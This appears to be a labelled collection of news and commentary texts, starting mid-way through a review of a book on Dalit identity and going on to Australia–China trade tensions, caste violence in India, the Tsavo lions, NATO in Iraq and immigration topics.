feel the burden of being “different.” This makes Dalits to strive “to be someone apart from a Dalit.” (p 288) “The Dalit lives in the miasma of Brahminical devaluation. The differences are markers of hatred, pain and suffering” (p 289). While liberal Brahmins often lament Brahmin orthodoxy, they do not attack the “caste system in its entirety.” Therefore, there is a thin line between Brahmins and Brahminism. The author feels that “blindfolding when it comes to privilege” (p 245) is widespread in India. It is the Dalits and lower castes who are projected as corrupt, while large-scale looting of public money is done by the upper castes. Landed castes, as neo-Kshatriyas, are in the race too to loot public wealth. There were several Brahmins who were close companions of Phule and Ambedkar in their call to social revolution, and their sacrifices, courage and humanity deserve admiration. But, they tended to distance themselves when Ambedkar made the caste question primary. In India’s caste-setting, there is an urgent need of “cultural suicide-bomber Brahmins who are willing to self-immolate and blow themselves up culturally” (p 291). The Idea of the Dalit Self What is it that has made Dalits to survive against all odds, when barricades are drawn against them and they are “policed since childhood, their actions being disciplined through the caste codes”? It lies in their “innate capacity to cultivate self-love in the bareness of apathy and tragedy” and “the audacity to hope while locked in darkness.” It lies “in the resolution of the community to adhere to the principle of love” (p 46) from which arises the principle of compassion. It is the courage to love in the face of oppression that forms their bridgehead to humanity. It is this attribute that nurtures a disposition of non-violence. The community privileges reason too. “It values the best of others and acknowledges the worst in others as a human fallibility” (p 56). Brahminical culture does not accord recognition to Dalit endowments, leave alone achievements. Dalits are the “carriers of alternative traditions of countercultures” that are repositories of “subtle modes of survival.” Humour is the most valued human expression in Dalit circles. Dalit language too is an expression of the art of resistance and survival. It harbours a spirit of universalism, common humanity, and maitri or fellowship. Striving to “a horizontal order where no one is downgraded to sub-humanity” is common across Dalits. To global struggles, they hold forth the experience of “their ability to thrive” amidst adversity. An Alternative Imaginary The author feels that Dalits seek a “system of radical democratic governance operated by Dalits and non-Dalits of a liberal-radical bent” (p 89). “Dalit radicalism and Dalit dissent” would be an important resource for the same. Such a striving would tap “the glorious past and historical connection of Dalits to their ancestral chord” and Ambedkar’s radical legacy and his colossal scholarship that sought a “class-based solution for all castes” (p 83). While the middle class harbours within it contradictory tendencies, and as a sociological concept is susceptible to diverse readings, it would be a false image of Dalit middle class if we equate it with the “salaried wage-negotiating class which mostly works in the service industry or public sector” (p 163). From the 1990s, there is a new Dalit middle class in the offing. This class “is largely urbane, aware, conscious and ready to fight, and is committed to their conviction for the community” (p 164). This class possesses the social capital to stand on an equal footing with the rest. They have led movements, floated a large number of bodies, unions, organisations, political parties and offered ideological guidance. “They have matured the critical theory of Dalit liberation and made it publicly accessible for the general mass” (p 167). They promote “progressive values,” “defy the regressive backwardism” imposed on them by “caste ecology” and question “the legitimacy of the state led by the dominant caste minority” (p 175). Dalits are committed to a nationalism that upholds “respect for everyone,” “dignity and justice” that each person owes to another, centres around Dalit lives, and redraws human boundaries. While there is an absence of hatred in it, it is ever-ready to retort the privilege blind. Dalits do not seek merely emancipation, that is, reforms and change of attitudes within structures which keep their agency stunted, but liberation, that is, to make themselves the “governing class,” set up their own agenda, and privilege their own experiences. It factors in the oppression grounded on gender, religion, race and sexuality as integral to Dalit concerns. Distortions and Loud Claims If concern and the advocacy that ensues from it is the case, then you have much to take home in this book; if it is scholarship, then much of what the author says has already been said by others. There are category problems: caste and untouchable/Dalit while they share some things in common, are also very different realities. The untouchable is at the bottom of the caste, but they are also outside the system, and consequently weighed down by all the dung-heap that everyone else throws at them. The author largely focuses on the latter, but by simply encompassing them within the frame of caste, the book sheds little light on the kind of alignments that are required. While untouchability is a hydra-headed evil, its most stark reality is still in the countryside where humiliation and violence are imminent. Dalit women bear this brunt much more than others, and there are few sanctions against such onslaught. While such crude practices of untouchability are still extant in India’s urban landscape, and even in the diaspora, they are much more nuanced. Just because they are nuanced, they are not less effective, but untouchability practices in much of India’s countryside are a class apart in barbarity. The author does not pay any serious attention to this distinction. The practice of untouchability, and the kind of resources and opportunities that Dalits can access to are very uneven in India. The internal cleavages within Dalits can exacerbate this unevenness much further. The Maharashtra-focused experience that informs the book does not pay much heed to this unevenness. While Ambedkar remains the towering exemplar across this unevenness, this appeal remains too varied. The author does not show adequate attention to the wider cultural embeddedness of Dalits, a cultural resource that is increasingly co-opted by the Sangh Parivar today. The author does not seem to be very aware that Dalit communities all over India have held on to their folklore and cultural assertions. These resources form the bridgeheads to connect them to non-untouchable lower castes.  EPW looks forward to your comments. Please note that comments are moderated as per our comments policy.

0,"  An electronic screen advertises free COVID-19 testing being offered at Bondi Beach in Sydney on April 22, 2020. Sydney's Bondi Beach remained closed as authorities increased testing to deal with the coronavirus pandemic. / AFP / Saeed KHAN  SYDNEY - Australian Foreign Minister Marise Payne has cautioned China against attempts at ""economic coercion"" as Australia pushes for an investigation into the coronavirus pandemic that China opposes. Chinese ambassador to Australia, Cheng Jingye, said in a newspaper interview on Monday the ""Chinese public"" could avoid Australian products and universities. Australia last week called for all members of the World Health Organization (WHO) to support an independent review into the origins and spread of the coronavirus, and is lobbying world leaders. China's foreign ministry has attacked the proposal. ""Maybe the ordinary people will say 'Why should we drink Australian wine? Eat Australian beef?',"" Cheng said in the interview published on the front page of The Australian Financial Review. Cheng said it was possible that tourists may have ""second thoughts"" about visiting Australia. ""The parents of the students would also think... whether this is the best place to send their kids,"" he added. After energy exports, education and tourism are Australia's biggest export industries, with China the largest market. Payne said in a statement on Monday that Australia had made a ""principled call"" for an independent review of the COVID-19 outbreak which started in the Chinese city of Wuhan. ""We reject any suggestion that economic coercion is an appropriate response to a call for such an assessment, when what we need is global cooperation,"" Payne said. China is the largest export market for Australian wine and beef. During strained diplomatic relations with China in 2018, Australian wine faced import delays in China and some Australian beef exports were also previously suspended for a period. The Chinese embassy in Australia has previously warned Chinese students about what it said were safety risks in travelling to Australia. Payne said an ""honest assessment"" of the pandemic would seek to strengthen the WHO's role.      Check all issues & supplements  Copyright © 2022 The Peninsula"

0,"Raipur: In a deplorable incident, two youths belonging to the Dalit community were allegedly tied to a tree, brutally thrashed and forced to lick their spits after being accused of killing goats belonging to people from Yadav community at Ghaghardiha village in Jharkhand’s Giridih district. Later, the youths were only let off after they paid Rs 60,000 to the goat owner as fine ordered by the village panchayat. The affected youths have been identified as Parmanand Kumar Das and Shankar Kumar Das. Parmanand said that on Monday, some goats had ventured into their land, following which they tried to whisk them away. He added that the goat owners noticed them hitting and dragging out the goats. Later, the owners allegedly killed the goats by slitting their throats, threw the carcasses in the field belonging to the Dalit youths and accused them of killing their animals. The following morning, the owners dragged the youths out of their houses and tied them to a tree. Then, they were thrashed in the village head’s presence by hundreds of people from Yadav community, according to a report by The New Indian Express. Parmanand claimed that the accused were threatening them with death even after the payment of the fine. The accused allegedly thrashed the family members of the victims when they attempted to resolve the matter through mediation. “Parmanand and Shankar were being beaten before Mukhia and when I reached there, they also started beating me. The two were also made to lick their spit and imposed a fine of Rs 30,000 each,” the report quoted a family member as saying. Village head Baleshwar Yadav dismissed the allegation that the youths were forced to lick their spits. He said that they were just tied to a tree and were later let off. Based on the complaints filed by the two groups, police have lodged two FIRs in connection with the incident. Reportedly, the Dalit youths have named 18 people, including the village head, in their complaint.

0," The United Nations Declaration on the Rights of Indigenous Peoples (UNDRIP) was adopted by the General Assembly on Thursday, 13 September 2007. The Declaration is the most comprehensive international instrument on the rights of Indigenous peoples. It establishes a universal framework of minimum standards for the survival, dignity and well-being of the Indigenous peoples of the world and it elaborates on existing human rights standards and fundamental freedoms as they apply to Indigenous peoples.

0,"We all know that humans can be serial killers, but there was a documented case in Tsavo East Africa in the late 1800s which tells of two man-eating lions leaving a deadly path of human carnage in their wake. Some say although the lions made meals of most of their victims, they might have hunted for sport too because humans don’t fit into their normal dietary needs which calls for higher amounts of protein and larger bones. The story was the basis of a movie starring Michael Douglas and Val Kilmer called The Ghost and the Darkness, which itself took artistic liberty with the written, terrifying eyewitness accounts by Lt. Col. John Henry Patterson in his book The Man-Eaters of Tsavo. Michael Douglas and Val Kilmer in “The Ghost and the Darkness.” Patterson, an engineer, was commissioned in 1898 to oversee the construction of a bridge that would span over the Tsavo River for the British railroad. But his mission was delayed several times by two male lions that had developed an odd taste for his staff. Several thousand workers were employed by Patterson to build the bridge. They lived in an expansive makeshift town consisting of tents and structures which offered very little protection against the harsh savanna ecosystem. The rogue lions were a part of this biotic community. Unlike their well-known Serengeti counterparts, Tsavo males can be identified by their maneless heads, a detail missing from the movie.  It wasn’t long before Patterson settled into his new surroundings when these bold felines began to attack his men. They would prowl around the encampment, taking turns pulling men from their tents ripping them apart from limb to limb. This went on for a while until the cats stopped showing up, only to return with a vengeance a few months later. Upon their return, they increased their murderous rampage. The cats successfully traversed any traps, scare tactics or barbed fencing the men could come up with. What’s more, the cats were working in tandem now. Scared for their lives construction workers abandoned the project bringing production to a stand still. Completely overwhelmed and sorely behind schedule, British officials were determined to get rid of these maneating pests. Val Kilmer and Michael Douglas in “The Ghost and the Darkness.” Enter about 20 Indian armed soldiers who did nothing but agitate the cats even further, it was Patterson they wanted and in their pursuit of him, managed to avoid the hired guns. Which begs the question: Can animals hold a personal vendetta? These two did according to Patterson. They had become angered at his constant meddling and gunfire. In defiance, he managed to shoot one cat in the leg. It ran off but despite its wound, returned with a thirst for Patterson’s blood. It was man versus beast until Patterson got the upper hand, took aim and struck the lion in the heart with a bullet, killing it. The beast was over 9-feet-long and required the help of several men to carry it away. The second lion met with the deadly end of Patterson’s rifle but like its brother also managed to survive, fleeing into the savanna wounded and angry. Eleven days later Patterson found it and shot it 6 more times, once fatally in the head. Patterson said the cat, even while dying, pawed at a tree branch trying to reach him before taking its last breath. In all, the cats managed to kill about 135 people, although scientists argue that the number is hyperbolic and lies somewhere in the dozens. The two cats actually had help from a third, but it was killed before Patterson’s arrival and therefore undocumented. The giant pelts of Patterson’s spoils would become his household throw rugs for many years before they were sold to the Field Museum in Chicago for $5,000. Curators eventually stuffed them to make a lifelike diorama.  As for why the big cats would hunt human flesh, one Tsavo cat researcher, Bruce Patterson (unrelated to John), said in an interview, they might have done so “because we are slower, weaker and more defenseless.” You can read James Henry Patterson’s full account in his book, The Man-Eaters of Tsavo.  @2021 - All Right Reserved."

Captain Treone Larvadain has been promoted to lead the unit, making her the first African American female captain in LSP history. She succeeds Captain Clay Chutz, who recently retired after 30 years of service with LSP under six different governors (Buddy Roemer, Edwin Edwards, Mike Foster, Kathleen Blanco, Bobby Jindal, and John Bel Edwards). I am happy to announce Captain Treone Larvadain has been promoted to lead the @LAStatePolice Protective Services division, becoming the first African-American female captain in State Police history. #lagov #lalege 📰: https://t.co/6SvYeF93ar “I am extremely proud of both Captain Larvadain and Captain Chutz and congratulate them on their accomplishments.

My family and I are especially grateful for the professional work Captain Chutz has provided to us over the last four years and have the utmost confidence in Captain Larvadain, who has worked alongside him and has now taken over the reins. The longevity of Captain Chutz’s career and the promotion of Captain Larvadain are a direct reflection of their dedication and commitment to the force and our great state,” said Gov. Edwards.

0,"Social media users expressed outrage after Munich police use stock photo of a white male to describe sexual assault involving an Eritrean A 31-year-old African migrant was arrested by Dachau police officers for sexually assaulting and threatening a 15-year-old German girl last week, but the assault sparked further outrage after the Munich police department posted a stock photo of a white male to describe the crime. According to the police report, the teenage girl said the African male first spoke to her at the Dachau train station at 10 p.m on a train headed for Munich. After becoming uncomfortable with the encounter, she fled to another part of the train, prompting the Eritrean male to follow her. After sitting next to her, he began stroking her legs and tried to kiss her in her genital area. She tried to flee again, but he grabbed her and reached under her T-shirt and pants. She struggled free again, but he told her at the Röhrmoos S-Bahn stop that she should get out with him and threatened her. He then tried to grab her arm and took her cell phone. When she refused to go with him, he threw her cell phone back on the train and fled from the scene. The girl then ran to another part of the train where another man helped her. The good Samaritan got out with the 15-year-old at the Vierkirchen station and informed the police what occurred. In the vicinity of the Röhrmoos train station, Dauchau police officers apprehended the 31-year-old Eritrean suspect who lives in the Dachau district. The federal police are investigating the Eritrean for sexual harassment and threats. The 15-year-old girl identified the suspect by sight after he was in custody. In response to the comments posted on Twitter regarding police using a white male for its crime report, the Bavarian police commented on the thread, saying they would discuss the matter internally.

0,"German Wadi Organization announced that Germian region in the Kurdistan Region of Iraq is free of female genital mutilation (FGM) after years of spreading awareness. On Thursday, February 6, 2020, in the Kalar district under Kurdistan Region’s Germian administration, Wadi organization with the help of Netherland Consulate arranged a conference on the International Day of Zero Tolerance for FMG in which they announced that Germian region is free of FGM. Based on their statistics, in 2019, no cases of FMG was recorded in Germain, however, 161 and 162 cases were recorded in Erbil and Ranya, respectively. In 2018, 29 cases were recorded in the Gemian Region. Wadi launched Stop FMG campaign in Germian and some other areas in 2015. Iman Nuri, a member of a Wadi mobile team in Germian, said, “Wadi efforts to combat FMG has continued for 15 years in Germian, Erbil, Halabja, and Ranya and now Germian is free of FMG.” Wadi helps any villages or areas free of FMG with services and projects that are in its capacity. “It is a historic and happy day for all people of Germian because they are pioneer in zeroing FMG. This is an achievement and an honor. We hope that the other areas will take the same step,” Iman added. Iman mentioned that After declaring that Germian is free of FMG, Wadi’s further efforts will be working on eliminating the effects of FMG and the issues that emerges from it. Ending FMG in Ranya, Erbil and Halabja will be another project that the organization will work on in the future with the support of Netherland Consulate in Erbil. Kurdistan Region’s parliament law number 8 of 2011 is helpful to end FMG as it bans it and sets punishment for it.

0,"Weeks after the Hathras horror, another Dalit girl was allegedly raped and strangulated in a village in Barabanki district on Wednesday. Her body was found in paddy field, according to her family. Police had initially filed a murder case against an unidentified person. Later, after the postmortem report confirmed sexual assault, the charge of rape under IPC section 376 was added to the FIR. “On Wednesday, the FIR was registered under section 302 of the IPC. On Thursday, we have added section 376 (rape) of the IPC based on the postmortem report. We are questioning a few suspects after primary investigation,” said Additional SP (Barabanki) Ram Sewak Gautam told The Indian Express. However, due to confusion over the girl’s age, police have not added the charges under the Protection of Children from Sexual Offences (POCSO) Act. While the family claimed that they told the police that she was 17 years old, police said that in their oral complaint the family had said that the girl was slightly above 18 years. According to the girl’s father, she had left for the fields in the day to harvest the crop. “Around 5.30 pm, she had not returned home. I got worried and started looking for her. Around half an hour later, I went to the field and saw her slippers. A little ahead, I found her lifeless body,” the father told The Indian Express. The victim was the eldest of four siblings. While her younger sister is around 15, her twin brothers are around seven. “We received the information of a body found in a paddy field in the village under mysterious circumstances. We are collecting all the evidence and a team has been formed under Additional SP-rank officer. We will soon be able to crack the case,” said Additional SP Gautam who is currently holding the charge of SP in the district. Asked about the discrepancies in the age of the victim and whether she was a major or minor, IG (Ayodhya Range) Sanjeev Gupta said it would have no bearing on the investigation. Initially, the family had refused to cremate the body. But after an assurance from the police, the body was cremated on Thursday evening by her family members. 📣 The Indian Express is now on Telegram.

0,"The victim, Prasad, was admitted to the Rajahmundry government hospital for treatment. (Photo: News18) A Dalit man was beaten and his head tonsured at Seethanagaram police station, in Andhra Pradesh's East Godavari district on Sunday night. The incident occurred after the victim, Prasad, was taken to the police station following an alleged confrontation with a local YSRCP leader. Prasad was admitted to the Rajahmundry government hospital for treatment. A sub-inspector and a constable have been suspended and the police have also registered a case against Prasad for stopping the truck of a local YSRCP leader. ""My relative had passed away on Sunday. We were performing the last rites. During this, a truck was trying to move through my street. As last rite formalities were taking place, I and three others stopped the movement of the sand truck and we asked the truck driver to wait for some time until the body was moved from the place. This led to an argument,"" Prasad told reporters. He added that an hour after the incident took place, the YSRCP leader came to his residence and issued threats for stopping his truck. ""A day after this incident, sub-inspector police Shaik Feroze Shah, along with two other constables, took me and two others to the police station for investigation,"" He added. Prasad alleges that the SI had punched him and thrashed him with a belt. ""The SI later called a barber, got my head tonsured, and my moustaches removed,"" he said.  Opposition leader N Chandrababu Naidu, while reacting to the incident, said that 'jungle raj' had returned to Andhra Pradesh. ""Vara Prasad's head was tonsured by leaders belonging to YCP in East Godavari District's Seethanagaram Police Station. All this happened in the presence of policemen who heckled and beat the man to a pulp, destroying the self-esteem of a Dalit man. His only mistake was to question the illegal sand mining in the region,"" he wrote on Twitter. He further questioned why the Andhra Pradesh police had become ""toys in the hands of corrupt ruling partymen."" ""This is a serious violation of rights. Telugu Desam will stand with Vara Prasad and make sure those responsible for this barbarian act be strictly punished,"" he added. The Andhra Pradesh DGP has initiated an inquiry into the matter and suspended the SI and constable over allegations of beating the man."

0,"NATO is considering an increase to its training mission in Iraq to relieve the burden on the US-led coalition against Daesh, senior officials and diplomats said on Tuesday, Reuters reports. NATO and the coalition have non-combat ""train-and-advise"" missions which aim to develop Iraqi security forces but both are suspended over fears for regional stability after a US drone strike killed a top Iranian commander in Baghdad on Jan. 3. After the killing, US President Donald Trump called on NATO – founded in 1949 to contain a military threat from the Soviet Union – to do more in the Middle East but he has not specified publicly what that might entail. NATO defence ministers including US Secretary of Defense Mark Esper will discuss options for non-combat operations in the Middle East at a two-day meeting in Brussels starting on Wednesday, NATO Secretary-General Jens Stoltenberg said. ""We are discussing what more NATO can do,"" he told reporters, adding that the alliance would first seek to restart the training with the Iraqi government's blessing. READ: Support for NATO plummeting in Europe, lowest in Turkey US Ambassador to NATO Kay Bailey Hutchison said the alliance was also seeking military advice, both from NATO and Iraq, on how to increase the mission, but gave no details. ""I think it will definitely be the answer to what President Trump has requested,"" she said. Established in Baghdad in October 2018, the NATO training mission in Iraq numbers some 500 personnel. It does not deploy alongside Iraqi forces during their operations. Two allied diplomats told Reuters the number of NATO trainers in Iraq could rise to as much as 2,000, but it would not be a net increase of Western troops in Iraq because the US-led coalition would simply re-assign trainers. While symbolic, the coalition is outside NATO structures. Putting more personnel under a NATO flag would solidify training in Iraq and could make it more long-term, also cementing NATO's presence in the region. When Trump first raised increasing NATO's role in the Middle East in 2017, France and Germany resisted, worried that NATO would be caught up in another costly, Afghan-style deployment, anger Arab countries or risk confrontation with Russia in Syria. But diplomats said Paris and Berlin were now open to an expanded NATO mission in Iraq because it was non-combat, held fewer risks, would not be under a US general's command and would go some way to mollifying Trump, a sharp critic of NATO.

0,"AARP Rewards is here to make your next steps easy, rewarding and fun! Take a look. Conditions & Treatments Conditions & Treatments by Peter Urban, AARP, June 9, 2020 Getty Images En español | Just in 2015, racial disparities in cancer mortality rates cost the African American community an additional $3.2 billion in lost earnings compared with whites, according to a report released in June from the American Cancer Society. The study, led by the organization's public health researcher, Jingxuan Zhao, used national cancer death and life expectancy data from 2015 to determine “person-years of lost life” by race. Researchers then used federal statistics on annual median earnings to calculate lost earnings. For African Americans on average, each cancer death resulted in 19.7 years of lost life and $232,600 in lost earnings. For whites, the average was 17.2 years of lost life and $175,600 in lost earnings. In 2015, the disparity meant the African American community had an additional 241,334 person-years of lost life and $3.2 billion more in lost earnings than the white community, according to the study. Join today and save 25% off the standard annual rate. Get instant access to discounts, programs, services, and the information you need to benefit every area of your life. ""Since the 1960s, black men and women have had higher cancer mortality rates than their white counterparts,” says the study, published June 3 in the medical journal JNCI Cancer Spectrum. “Cancer disparities by race/ethnicity [also] vary at the regional level in the United States, illustrating the importance of state and local policies."" To address the disproportional economic burden that African Americans face, the study suggests the importance of improving equal access to effective cancer prevention, screening and treatment. A higher percentage of white females undergo a mammography for breast screening compared with black females, the study noted. Black and Hispanic women diagnosed with breast cancer are at greater risk of having a one- to three-month delay in the start of treatment. And black women were less likely to receive radiation therapy after undergoing breast-conserving surgery. The study also noted the importance of bringing more racial and ethnic diversity into the workforce that specializes in oncology and increasing health insurance coverage to minority populations. ""The burden of many of these cancers could be reduced through improving access to effective, high quality and targeted cancer prevention, screening and treatment for these vulnerable populations,” the researchers say. “Broad, equitable application of strategies to address these issues will be essential for reducing the economic burden associated with racial/ethnic cancer disparities.""

0,"Vanchit Bahujan Aghadi (VBA) president Prakash Ambedkar Tuesday reiterated his reservations to the proposed statue for Dalit icon Dr B R Ambedkar and suggested that an international study centre dedicated to the architect of the Indian Constitution would be a better tribute. The Dalit leader’s comments come days after he suggested the Bombay High Court asked the state government to utilise funds sanctioned for the proposed statue of his grandfather at Indu Mill in Mumbai for improvement of the cash-strapped Wadia hospitals for women and children instead. “The greatness of B R Ambedkar cannot be measured with the height of a statue. It is a futile exercise undertaken by successive governments to serve their politics,” Prakash Ambedkar told The Indian Express. On January 15, the Maha Vikas Aghadi (MVA) government had approved a proposal to raise the height of the proposed statue for Ambedkar by 100 feet and cleared the revised expenditure of Rs 1089.95 crore from Rs 750 crore for it. The VBA chief said, “I have conveyed my reservation to the present plan for the memorial with chief minister Uddhav Thackeray. I have also offered to discuss with them my original concept, which was evolved way back in 1998-99 when the NDA government was at the Centre.” He added then prime minister Atal Bihari Vajpayee had given his consent for an Ambedkar International Study Centre, but could never be translated into reality as mainstream political parties, including BJP, Congress, Shiv Sena and NCP, were keen on a memorial and a statue. “What is the purpose of having another statue of Ambedkar in Mumbai? At the most, it will be taller than the ones already existing at Chembur and Vidhan Bhawan. And political parties will just take the credit for the same and use it for their vote bank in successive elections… Let us not reduce the proposed Ambedkar memorial to a picnic spot or tourism centre,” the Dalit leader said while pressing for a world-class study centre. 📣 The Indian Express is now on Telegram.

Expatriates from around the world are finding Canada to be the ideal immigration destination. Because of Canada's pro-immigration stance, hard-working and experienced Asian expats from a large number of predominantly Asian countries are finding well-paid jobs in communities they can feel at home in. Asian expats are making the move to Canada for one reason, and it’s the same reason any logical person would want to immigrate to Canada for, a better quality of life. Canada’s progressive policies mean people are free to be who they want, they are free to pursue their dreams and most importantly, have unfettered freedom of choice. The Canadian government places no restrictions on people or families, and your value is determined by how hard you work, how smart you work, and the value you add to your local economy. There are pathways for businesses owners, professionals, tradesmen and semi-skilled people alike who are interested in Canadian immigration. Canada offers a high quality of living for all expats from around the world. Asian expats are raising families in cities in towns with low to negligible crime rates, incredible public services such as free healthcare and schooling, pristine air quality and inclusive communities. Canada is a melting pot of diverse cultures from all around the globe, and while pockets of cultures will form everywhere, they are constantly intermingling and doing business with each other for the benefit of their own communities and the country as a whole. Chinese and Indian residents and citizens make up the largest groups of expats in the country, followed by ex-UK residents. As a matter of fact, 20.8% of Canada’s population is made up of immigrants, the highest of the G8 countries. Opportunities for immigrants in Canada are nearly endless, it is a country where you and your family can achieve whatever you set your sights on.  There are two main immigration pathways for business owners to consider when looking into immigrating to Canada. The Provincial Nomination Program is a dedicated immigration stream for provinces to address shortages in the community. Each province has its own set of requirements for opening a business in one of their towns, cities or communities. A general outline of these requirements are: The Start-up Visa Program targets entrepreneurs who have the initiative to build a business that is innovative and will create jobs for Canadians. This visa program requires a comprehensive business plan and financial backing from a designated organization in Canada.  The Express Entry System was created with the intention of fast-tracking qualified and experienced applicants that are in-demand by Canada’s labour market. If you are a manager, professional or skilled tradesman, you may be eligible for Express Entry. Some examples of eligible occupations are: Because the majority of Asian immigrants in Canada land on the west coast of Canada, they tend to settle in provinces such as British Columbia, Alberta, Saskatchewan and Ontario. This is one of the reasons why the Atlantic Immigration Pilot was launched, to attract more capable individuals to Canada’s easternmost provinces; Prince Edward Island, Nova Scotia, Newfoundland & Labrador and New Brunswick. This very inclusive immigration pilot makes provisions for the following categories:  With all of these immigration and visa options to choose from, the process can become quite overwhelming and confusing.

Or continue login with Six Chinese nationals have been stranded on Rote Island, East Nusa Tenggara (NTT), following a failed attempt to reach Australia in a wooden boat. Before going aground on the island's shore, the boat, which sailed from the coastal province of Jiangsu in China, has reportedly been floating in the waters near Rote Timur district after an Australian patrol vessel drove it away from its territory. Rote Ndao Police chief Sr. Comr. Bambang Wibowo said the Chinese citizens — identified as Fan Shenghong, Cui Henggo, Hang Yongsheng, Wang Sisen, Han Baolin and Chu Kaishan — were still on board their boat as of Tuesday evening and were under police custody because they did not possess complete travel documents. ""The [Chinese citizens] were previously questioned in the middle of the sea on board an Australian patrol boat for two nights before they finally got released and escorted to Indonesian waters,"" Bambang said on Tuesday. Two Indonesians who accompanied the Chinese on the boat, identified as Aba and Madan — residents of East Flores and South Sulawesi, respectively — were questioned by the Rote Timur Police as they were accused of helping to smuggle the foreigners to neighboring Australia. According to the police, the six Chinese nationals initially attempted to sail to Australia in a wooden boat identified as the KMP Indah. The journey took three nights. After getting intercepted by the Australian authorities, the latter gave the Chinese nationals a new boat and two jerry cans of fuel after confiscating the KMP Indah. However, they ran out of fuel just after arriving in Indonesian waters at about 8:15 a.m. Indonesian Central Time. They proceeded to drop anchor close to the FaiFua salt mine in East Rote district. “They were found by two patrol boats from Polairud [a water and air police unit] and the Rote Navy base, which were patrolling together at that time. They found the Chinese residents when they were inspecting the boat,” Bambang said. The police summoned health officers from Rote Ndao to see if the Chinese residents were infected by coronavirus. “The result was negative,” he added. The police are still coordinating with the Kupang immigration office to see if the Chinese residents could be moved to Kupang. (dpk)  © 2016 - 2022 PT. Bina Media Tenggara"

This was published 1 year ago Chinese education agents say they will not recommend studying in Australia and have threatened to divert thousands of students to the UK as the sector reels from a dispute between Australia and its largest trading partner. The comments are the first sign that a warning delivered by China's Ministry of Education on Tuesday will trickle down to consumers, as education agents accuse Australia of discriminating against their students and using them as a cash cow. Universities face major losses if Chinese students stop coming to Australia. Credit:Louise Kennerley China is the largest source of overseas students at Australian universities and any decline would put at risk an estimated $3.1 billion of revenue paid by Chinese nationals to the Group of Eight elite research universities alongside RMIT and the University of Technology Sydney. Austlink chairwoman Amy Mo, a Beijing education agent who has operated in the Australian market for 15 years, said the deteriorating relationship would bring ""immeasurable economic losses to Australia"". ""If Australian politicians don't regret and keep being the running-dog of the United States in the name of so-called values, Chinese tourists and students will not go there,"" she said. ""I hope Australia can change its attitude toward China. If a country loves Chinese money but doesn't like Chinese people, China surely is not willing to do business with it."" Ms Mo, who sends 2000 students to Australia a year, said she would consider ""opening up the UK market"" unless relations improved. Chinese students account for about 60 per cent of international enrolments at the Group of Eight overall, including 69 per cent at the University of Sydney, 66 per cent at UNSW, 56 per cent at the University of Melbourne and 57 per cent at Monash University. They make up 37 per cent at RMIT and 53 per cent at UTS. Education agents are responsible for 73 per cent of Chinese student enrolments at Australian education providers. Analysis of enrolment figures and university financial results indicates around 110,000 Chinese enrolments were worth approximately $3.1 billion to these 10 universities in 2018, the bulk of a total $5.4 billion they took in from international student fees. Luke Sheehy, executive director of the Australian Technology Network of universities, including RMIT and UTS, said the sector had prioritised the welfare of students during the COVID-19 crisis and campuses were ""vibrant, safe and welcoming places"". ""International students are an important part of our communities. We look forward to welcoming all students back, including those from China and overseas as soon as possible,"" he said. The sector felt the brunt of coronavirus restrictions early after Australia shut its borders to non-Australian residents travelling from China on February 1. Three years of strained relations between the two countries deteriorated further after Australia called for a global independent inquiry into the origins of the coronavirus in March. China accused Australia of being a puppet advancing US interests in the region and launched two trade strikes on $1 billion worth of beef and barley in April. It followed up this week by warning tourists to reconsider travelling to Australia due to ""an alarming increase"" in racial discrimination and violence during the pandemic. The allegations have been rejected by the Australian government. Ma Yu, an education marketing consultant at Aoji.cn, said the ministry of education's warning would ""definitely bring a huge impact to their willingness to study abroad"". ""Parents are keen on the safety of their children and put safety as priority,"" she said. Salvatore Babones, adjunct scholar at the Centre for Independent Studies and associate professor at the University of Sydney, said the escalation was the latest step in the Chinese government's push to discourage citizens from going overseas to study. ""I think our universities should expect very few new Chinese commencements throughout the 2020s,"" he said, arguing that the Chinese government wanted to get people studying at domestic universities and to prevent capital flight from the country. Trade Minister Simon Birmingham said a withdrawal of Chinese students would be a loss to both economies. ""For the long term, it would do nothing to help further the mutual understanding between our two nations,"" he said. The University of Wollongong was the first Australian university to have its ratings outlook cut to negative on Wednesday. Global ratings agency S&P warned its finances could deteriorate if it is unable to mitigate the revenue loss caused by a decline in onshore international student enrolments. S&P reaffirmed the University of Melbourne's stable rating, but warned downward pressure could occur if travel restrictions persist well into 2021. John Manning, the vice president of Moody's Investors Service, said China's recent travel advice for students highlights the vulnerability of Australia's higher education sector to geopolitical tensions between Australia and China. ""Next year, revenues will largely depend on whether coronavirus-related travel restrictions are eased,"" he said. ""In the longer term, with a number of universities ranked among the best in the world, we expect Australia's institutions will remain attractive for international students."" A survey of 400 education agents across 63 countries by education provider Navitas found Australia's successful containment of COVID-19 had made it a more attractive study destination, while the reputations of Britain and the United States have suffered. China's Ambassador to Australia Cheng Jingye warned in April that consumers could boycott Australian products including beef, wine, tourism and universities over its pursuit of the inquiry. Of the three sectors hit by Chinese infringements since, wine is the only export yet to be targeted.

The post reads: “NOW WATCH THE BIG CHINESE TOURIST INVASION BEGIN. 200 MILLION CHINESE VISA's ALLOCATED FOR AUSTRALIA ALLOWING A 10 YEAR STAY.” Below is a screenshot of the post: The claim is false. Australia's Department of Home Affairs told AFP via email on January 23, 2020 that “there is no such allocation of 200 million visas"". According to the Australian Embassy in Beijing, Chinese citizens can obtain a visa through the “visitor visa (subclass 600) program,” which generally allows only three-month stays. Frequent Chinese visitors to Australian can apply for the program’s Frequent Traveller stream, which grants visas that are valid for 10 years but also limits each entry to a maximum three-month stay. According to the Department of Home Affairs website, the frequent traveller visa is for citizens of the People's Republic of China “who travel often to Australia for business or personal reasons.” Between July 2018 to June 2019, there were 1.43 million Chinese visitors to Australia and is the ""largest source country of short-term visitor arrivals"", according to the Australian Bureau of Statistics (ABS).

